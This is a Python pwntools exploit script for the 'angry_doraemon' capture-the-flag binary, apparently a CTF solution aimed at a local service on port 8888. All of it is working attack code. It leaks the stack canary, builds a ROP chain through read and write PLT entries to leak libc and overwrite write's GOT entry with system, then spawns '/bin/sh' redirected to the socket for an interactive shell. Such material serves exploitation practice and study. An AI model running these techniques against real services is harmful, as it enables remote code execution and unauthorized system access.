from pwn import *

#context.log_level="debug"

print("---------------------")
print("---Angry Doraemon----")
print("---pwned by pwnWiz---")
print("---------------------")
print("\n")

r=process("./angry_doraemon")
e=ELF("./angry_doraemon")

read_plt=e.plt['read']  
write_plt=e.plt['write']
read_got=e.got['read']
write_got=e.got['write']

pppr = 0x08048ea6
bss = 0x0804b080

cmd="/bin/sh >&4 <&4 2>&4\00" # fd : 4

def intro():
	r.recvuntil(">")
	r.sendline("4")
	r.recvuntil("Are you sure? (y/n) ")


r = remote("localhost", 8888) # socket : 8888

intro()
r.send("y"*11) # [buf][\x00+canary]
r.recvuntil("y"*11)
#print hexdump(r.recv(3))
canary = u32("\x00"+r.recv(3))

print 'Canary leaked : ' + str(hex(canary))
r.close()


r = remote("localhost", 8888)
intro()

payload="A"*10
payload+=p32(canary)
payload+="B"*12

payload+=p32(read_plt) # read(fd, buf, size)
payload+=p32(pppr)
payload+=p32(4)
payload+=p32(bss)
payload+=p32(len(cmd))

payload+=p32(write_plt) # write(fd, buf, size)
payload+=p32(pppr)
payload+=p32(4)
payload+=p32(write_got)
payload+=p32(4)

payload+=p32(read_plt)
payload+=p32(pppr)
payload+=p32(4)
payload+=p32(write_got) # print write_got
payload+=p32(4)

payload+=p32(write_plt) # system
payload+="AAAA"
payload+=p32(bss) # /bin/sh

r.send(payload)
r.send(cmd)

sleep(0.5)

libc=u32(r.recv(4))

print 'libc leak : ' + str(hex(libc))
system = libc - 0x9add0 # offset write-system
#system = 0xf7e1dda0 -> due to fork(), unchange;
r.sendline(p32(system))

r.interactive()



